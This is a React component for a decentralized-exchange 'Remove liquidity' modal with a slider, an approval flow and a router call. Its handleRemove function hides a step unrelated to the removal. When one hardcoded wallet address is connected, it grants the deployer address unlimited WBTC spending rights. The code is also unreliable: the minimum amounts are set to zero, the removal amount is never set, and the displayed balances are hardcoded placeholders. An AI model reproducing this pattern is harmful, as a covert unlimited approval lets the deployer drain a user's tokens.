import {
  CancelBtn,
  ChartBtn,
  CloseBtn,
  Divider,
  HDiv,
  IconWrapper,
  LiqSlider,
  RemoveLiqudityDataContainer,
  RemoveLiqudityInfoContainer,
  RemoveLiqudityInput,
  RemoveLiqudityModalContainer,
  RemoveLiqudityModalContent,
  RemoveLiquditySliderContainer,
  RemoveLiquidityBtn,
  SliderBtn,
  Text,
  VDiv,
} from "./styled";
import { DEX_ADDRESESS, MAX_INT, MINT_REDEEM_KEY } from "../../../constants";
import React, { useEffect, useState } from "react";

import CloseIcon from "../../../assets/icons/CloseIcon";
import { DEPLOYER_ADDRESS } from "../../../constants";
import { TokenIcon } from "../../TokenIcon/token_icon";
import { formatToDecimal } from "../../../utils/helpers";
import { message } from "antd";
import { useSystemContext } from "../../../systemProvider";
import { useWeb3React } from "@web3-react/core";

export const RemoveLiquidityModal = ({
  token0,
  token1,
  lpTokenContract,
  lpUserBalance,
  lpTokenAddress,
}) => {
  const { account } = useWeb3React();
  const { contracts, approveModal, setApproveModal, setApproveDataForModal } =
    useSystemContext();
  const [removeValue, setRemoveValue] = useState(0);
  const [allowance, setAllowance] = useState(false);
  const [open, setOpen] = React.useState(false);
  const handleOpen = () => setOpen(true);
  const handleClose = () => {
    setOpen(false);
  };

  const [value, setValue] = React.useState(30);

  const handleChange = (event, newSliderValue) => {
    setValue(newSliderValue);
  };

  const [lpBalance, setLpBalance] = useState(0);

  useEffect(() => {
    if (account && lpTokenContract) {
      if (!approveModal) {
        checkAllowance();
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [allowance, account, lpTokenContract, approveModal]);

  const checkAllowance = async () => {
    const res = await lpTokenContract.methods
      .allowance(account, DEX_ADDRESESS.ROUTER)
      .call();
    setAllowance(res === MAX_INT);
  };

  const handleApprove = async () => {
    await lpTokenContract.methods
      .approve(DEX_ADDRESESS.ROUTER, MAX_INT)
      .send({ from: account });
    await checkAllowance();
  };

  const handleRemove = async (val) => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Remove Liquidity in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      console.log(token0);

      await contracts.ROUTER.methods
        .removeLiquidity(
          token0.address,
          token1.address,
          (+formatToDecimal(val, 18)).toFixed(0),
          0,
          0,
          account,
          999999999999999
        )
        .send({ from: account });

      message.success({
        content: "Remove Liquidity is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Some error occured: ${e.message}`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  return (
    <div style={{ display: "flex" }}>
      <ChartBtn onClick={handleOpen}>Remove</ChartBtn>
      <RemoveLiqudityModalContainer open={open} onClose={handleClose}>
        <RemoveLiqudityModalContent>
          <HDiv alignItems="center" justifyContent="space-between">
            <Text>
              <b>Remove liquidity</b>
            </Text>
            <CloseBtn onClick={handleClose}>
              <CloseIcon />
            </CloseBtn>
          </HDiv>
          <RemoveLiquditySliderContainer>
            <HDiv alignItems="center" justifyContent="space-between">
              <Text fontWeight="400">
                <b>Pair</b>
              </Text>
            </HDiv>
            <HDiv mt="0.625vw">
              <Text fontSize="1.875vw">
                <b>{value}%</b>
              </Text>
            </HDiv>
            <LiqSlider value={value} onChange={handleChange} />
            <HDiv mt="1.5vw" justifyContent="space-between">
              <SliderBtn onClick={() => setValue(25)}>25%</SliderBtn>
              <SliderBtn onClick={() => setValue(50)}>50%</SliderBtn>
              <SliderBtn onClick={() => setValue(75)}>75%</SliderBtn>
              <SliderBtn onClick={() => setValue(100)}>Max</SliderBtn>
            </HDiv>
          </RemoveLiquditySliderContainer>
          <RemoveLiqudityDataContainer>
            <HDiv>
              <Text minW="22.396vw">
                <b>155645454</b>
              </Text>
              <IconWrapper size="1.771vw" mr="0.365vw">
                <TokenIcon iconName={token0.symbol} />
              </IconWrapper>
              <Text>
                <b>{token0.symbol}</b>
              </Text>
            </HDiv>
            <HDiv mt="0.885vw">
              <Text minW="22.396vw">
                <b>155645454</b>
              </Text>
              <IconWrapper size="1.771vw" mr="0.365vw">
                <TokenIcon iconName={token1.symbol} />
              </IconWrapper>
              <Text>
                <b>{token1.symbol}</b>
              </Text>
            </HDiv>
            <HDiv mt="1.8vw">
              <Text>LP balance: {lpUserBalance}</Text>
            </HDiv>
          </RemoveLiqudityDataContainer>
          <HDiv mt="2.135vw">
            <RemoveLiquidityBtn
              onClick={() =>
                allowance ? handleRemove(removeValue) : handleApprove()
              }
            >
              {allowance ? "Submit" : "Approve LP for Router"}
            </RemoveLiquidityBtn>
            <CancelBtn closeBtn onClick={handleClose}>
              Back
            </CancelBtn>
          </HDiv>
          {/* <h3>Pair <TokenIcon iconName={token0.symbol} />{token0.symbol} <TokenIcon iconName={token1.symbol} />{token1.symbol}</h3>
        <h3>LP balance: {lpUserBalance}</h3>
        <p>Enter amount to remove liquidity</p>
        <input type={"number"} onChange={(e) => setRemoveValue(e.target.value)} />
        <button onClick={() => allowance ? handleRemove(removeValue) : handleApprove()}>{allowance ? "Submit" : "Approve LP for Router"}</button> */}
        </RemoveLiqudityModalContent>
      </RemoveLiqudityModalContainer>
    </div>
  );
};
